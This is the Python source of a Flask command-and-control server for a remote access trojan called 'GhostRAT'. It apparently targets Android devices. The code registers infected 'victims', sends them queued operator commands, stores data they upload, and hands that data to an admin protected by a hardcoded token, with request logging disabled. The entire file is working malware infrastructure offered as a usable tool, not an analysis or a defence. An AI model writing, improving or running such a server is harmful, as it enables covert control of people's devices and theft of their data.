#!/usr/bin/env python3
"""
GhostRAT C2 Server — ALL ENDPOINTS FIXED
"""
import os
import json
import hashlib
import secrets
import time
from flask import Flask, request, jsonify
from datetime import datetime
import logging

app = Flask(__name__)

log = logging.getLogger('werkzeug')
log.disabled = True

victims = {}
commands = {}
data_store = {}

# HARDCODED TOKEN
ADMIN_TOKEN = "mysecret123"

# ============ HOME ============
@app.route('/')
def home():
    return jsonify({'status': 'GhostRAT C2 Active', 'victims': len(victims)})

# ============ VICTIM ENDPOINTS ============
@app.route('/victim/register', methods=['POST'])
def victim_register():
    try:
        data = request.get_json()
        device_id = data.get('device_id', 'unknown')
        model = data.get('model', 'Unknown')
        android = data.get('android', 'Unknown')
        victim_id = hashlib.sha256((device_id + str(time.time())).encode()).hexdigest()[:16]
        
        victims[victim_id] = {
            'device_id': device_id, 'model': model, 'android': android,
            'last_seen': datetime.now().isoformat(), 'online': True
        }
        commands[victim_id] = []
        data_store[victim_id] = []
        print(f"[+] New Victim: {victim_id}")
        return jsonify({'status': 'registered', 'victim_id': victim_id, 'check_interval': 20})
    except Exception as e:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/checkin', methods=['POST'])
def victim_checkin():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '')
        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        victims[victim_id]['online'] = True
        pending = commands.get(victim_id, [])
        commands[victim_id] = []
        return jsonify({'status': 'ok', 'commands': pending})
    except:
        return jsonify({'status': 'error'}), 400

@app.route('/victim/poll', methods=['POST'])
def victim_poll():
    return victim_checkin()

@app.route('/victim/upload', methods=['POST'])
def victim_upload():
    try:
        data = request.get_json()
        victim_id = data.get('victim_id', '') or data.get('device_id', '')
        
        # Find victim by device_id if needed
        if victim_id not in victims:
            for vid, info in victims.items():
                if info.get('device_id') == victim_id:
                    victim_id = vid
                    break
        
        if not victim_id or victim_id not in victims:
            return jsonify({'status': 'unknown'}), 404
        
        data_store[victim_id].append({
            'type': data.get('type', 'unknown'),
            'data': data.get('data', ''),
            'time': datetime.now().isoformat()
        })
        data_store[victim_id] = data_store[victim_id][-200:]
        victims[victim_id]['last_seen'] = datetime.now().isoformat()
        return jsonify({'status': 'stored'})
    except:
        return jsonify({'status': 'error'}), 400

# ============ ADMIN ENDPOINTS ============
def verify_admin(req):
    token = req.headers.get("X-Admin-Token", "") or req.args.get("token", "")
    return token == ADMIN_TOKEN

@app.route('/admin/victims', methods=['GET'])
def admin_get_victims():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    result = []
    for vid, info in victims.items():
        result.append({
            'victim_id': vid, 'model': info.get('model', ''),
            'android': info.get('android', ''), 'online': info.get('online', False),
            'last_seen': info.get('last_seen', '')
        })
    return jsonify({'victims': result})

@app.route('/admin/send_command', methods=['POST'])
def admin_send_command():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    commands[victim_id].append({
        'type': data.get('type', 'raw'), 'command': data.get('command', ''),
        'time': datetime.now().isoformat()
    })
    return jsonify({'status': 'queued'})

@app.route('/admin/get_data', methods=['POST'])
def admin_get_data():
    if not verify_admin(request):
        return jsonify({'error': 'Unauthorized'}), 403
    data = request.get_json()
    victim_id = data.get('victim_id', '')
    if victim_id not in victims:
        return jsonify({'error': 'Victim not found'}), 404
    pending = data_store.get(victim_id, [])
    data_store[victim_id] = []
    return jsonify({'victim_id': victim_id, 'data_count': len(pending), 'data': pending})

@app.route('/ping', methods=['GET'])
def ping():
    return jsonify({'status': 'alive', 'victims': len(victims)})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 8080))
    print(f"[!] ADMIN_TOKEN: {ADMIN_TOKEN}")
    app.run(host='0.0.0.0', port=port)
